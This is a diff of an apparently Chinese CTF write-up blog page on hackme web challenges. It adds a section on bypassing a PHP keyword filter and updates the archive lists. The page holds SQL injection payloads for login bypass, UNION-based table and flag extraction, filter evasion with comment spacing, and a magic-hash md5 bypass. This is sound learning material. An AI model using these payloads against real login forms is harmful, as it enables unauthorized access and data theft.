@@ -236,7 +236,7 @@ height:50vh;
     <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/tupian/123.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/tupian/456.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
@@ -261,7 +261,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">586</span> / Reading time: <span class="post-count">3 min</span></span>
+                        <span>Word count: <span class="post-count">630</span> / Reading time: <span class="post-count">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -403,6 +403,9 @@ height:50vh;
 <p>根据源码，payload为。</p>
 <p><code>admin\&#39; || 1=1 limit 1,1#</code></p>
 <h1 id="login-as-admin0-1"><a href="#login-as-admin0-1" class="headerlink" title="login as admin0.1"></a>login as admin0.1</h1><p>说是找隐藏的flag<br>我用<br><code>-1\&#39; union select 1,2,3,database()#</code> 登陆进去。<br>发现2 应该是回显位。<br><img src="/hackme/1.png" alt="1"><br>爆表<br><code>-1\&#39; union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),3,4#</code><br>爆列<br><code>-1\&#39; union select 1,(select column_name from information_schema.columns where table_schema=database() limit 0,1),3,4#</code><br>爆字段<br><code>-1\&#39; union select 1,(select the_f14g from</code>h1dden_f14g<code>),3,4#</code></p>
+<h1 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a>login as admin 1</h1><p>根据源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (strstr($strl, &apos; &apos;) || strstr($strl, &apos;1=1&apos;) || strstr($strl, &quot;&apos;&apos;&quot;) ||</span><br><span class="line">        strstr($strl, &apos;union select&apos;) || strstr($strl, &apos;select &apos;)</span><br><span class="line">    ) &#123;</span><br><span class="line">        return &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    return str_replace(&quot;&apos;&quot;, &quot;\\&apos;&quot;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>payload <code>admin\\&#39;/**/or/**/1/**/like/**/1/**/limit/**/1,1#</code></p>
 <h1 id="login-as-admin-7"><a href="#login-as-admin-7" class="headerlink" title="login as admin 7"></a>login as admin 7</h1><p>源码有这样一段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($_POST[&apos;name&apos;] == &apos;admin&apos; &amp;&amp; md5($_POST[&apos;password&apos;]) == &apos;00000000000000000000000000000000&apos;) &#123;</span><br><span class="line">    // admin account is disabled by give a impossible md5 hash</span><br><span class="line">    $user = &apos;admin&apos;;</span><br></pre></td></tr></table></figure></p>
 <p>用0e绕过00000…..</p>
 <p>所以直接用payload <code>QNKCDZO</code></p>
@@ -561,7 +564,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hide-and-seek"><span class="toc-number">1.</span> <span class="toc-text">hide and seek</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#guestbook"><span class="toc-number">2.</span> <span class="toc-text">guestbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LFI"><span class="toc-number">3.</span> <span class="toc-text">LFI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ping"><span class="toc-number">4.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#scoreboard"><span class="toc-number">5.</span> <span class="toc-text">scoreboard</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#login-as-admin0"><span class="toc-number">6.</span> <span class="toc-text">login as admin0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#login-as-admin0-1"><span class="toc-number">7.</span> <span class="toc-text">login as admin0.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#login-as-admin-7"><span class="toc-number">8.</span> <span class="toc-text">login as admin 7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dafuq-manager-1"><span class="toc-number">9.</span> <span class="toc-text">dafuq-manager 1</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#hide-and-seek"><span class="toc-number">1.</span> <span class="toc-text">hide and seek</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#guestbook"><span class="toc-number">2.</span> <span class="toc-text">guestbook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LFI"><span class="toc-number">3.</span> <span class="toc-text">LFI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ping"><span class="toc-number">4.</span> <span class="toc-text">ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#scoreboard"><span class="toc-number">5.</span> <span class="toc-text">scoreboard</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#login-as-admin0"><span class="toc-number">6.</span> <span class="toc-text">login as admin0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#login-as-admin0-1"><span class="toc-number">7.</span> <span class="toc-text">login as admin0.1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#login-as-admin-1"><span class="toc-number">8.</span> <span class="toc-text">login as admin 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#login-as-admin-7"><span class="toc-number">9.</span> <span class="toc-text">login as admin 7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dafuq-manager-1"><span class="toc-number">10.</span> <span class="toc-text">dafuq-manager 1</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1071,9 +1074,88 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 35
+        Total : 36
         </div>
         <!-- search  -->
         
@@ -1083,6 +1165,34 @@ top:50vh;
     
     
     
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/2018/05/09/php反序列化学习/" >ctf一道题目。php反序列化学习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/28/cookie与session/" >cookie与session的笔记</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
     
     <div class="archive-year"> 2022 </div>
     <ul class="year-list">
@@ -1100,6 +1210,11 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/2018/09/07/反序列化之phar学习/" >反序列化之phar://学习</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1173,11 +1288,6 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/2018/05/09/php反序列化学习/" >ctf一道题目。php反序列化学习</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2018/05/03/渗透测试/" >记一次kali渗透测试靶机</a>
         </li>
     
@@ -1213,41 +1323,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2018/04/10/scrapy笔记/" >Scrapy笔记</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2018/04/01/代码执行/" >rnpnet tiki-calendar.php页面存在代码执行漏洞</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2018/03/23/VehicleWorkshop/" >VehicleWorkshop上传漏洞本地复现</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/16</span><a class="archive-post-title" href= "/2018/03/16/redtiger level4/" >Redtiger题目</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/会员日Pwnhub复现/" >会员日Pwnhub题目的复现</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/php-security-calendar-2017/" >php-security-calendar-2017</a>
         </li>
     
     
@@ -1275,35 +1351,21 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/23/Hooskcms/" >Hooskcms 几个小洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/eyou前台getshell/" >eyoucms前台getshell复现</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/06/29/The game of bob/" >Bob 1.0.1</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/28/cookie与session/" >cookie与session的笔记</a>
         </li>
     
     
@@ -1331,7 +1393,50 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/23/Hooskcms/" >Hooskcms 几个小洞</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/06/29/The game of bob/" >Bob 1.0.1</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2018/04/10/scrapy笔记/" >Scrapy笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2018/04/01/代码执行/" >rnpnet tiki-calendar.php页面存在代码执行漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/16</span><a class="archive-post-title" href= "/2018/03/16/redtiger level4/" >Redtiger题目</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2018/03/15/会员日Pwnhub复现/" >会员日Pwnhub题目的复现</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/php-security-calendar-2017/" >php-security-calendar-2017</a>
         </li>
     
     </div>
@@ -1372,43 +1477,43 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
-    
         <span class="sidebar-category-name" data-categories="学习计划"><span class="iconfont-archer">&#xe60a;</span>学习计划</span>
     
-        <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
+        <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
     
         <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
     
-        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
-    
-        <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
+        <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
     
         <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
     
-        <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
-    
-        <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
+        <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
     
         <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
     
         <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
     
-        <span class="sidebar-category-name" data-categories="php反序列化"><span class="iconfont-archer">&#xe60a;</span>php反序列化</span>
-    
         <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
+    
+        <span class="sidebar-category-name" data-categories="Empire"><span class="iconfont-archer">&#xe60a;</span>Empire</span>
+    
+        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
+    
+        <span class="sidebar-category-name" data-categories="php反序列化"><span class="iconfont-archer">&#xe60a;</span>php反序列化</span>
     
         <span class="sidebar-category-name" data-categories="scrapy"><span class="iconfont-archer">&#xe60a;</span>scrapy</span>
     
         <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
     
-        <span class="sidebar-category-name" data-categories="后门"><span class="iconfont-archer">&#xe60a;</span>后门</span>
+        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
     
         <span class="sidebar-category-name" data-categories="代码执行"><span class="iconfont-archer">&#xe60a;</span>代码执行</span>
     
-        <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
+        <span class="sidebar-category-name" data-categories="后门"><span class="iconfont-archer">&#xe60a;</span>后门</span>
     
         <span class="sidebar-category-name" data-categories="线下赛"><span class="iconfont-archer">&#xe60a;</span>线下赛</span>
+    
+        <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
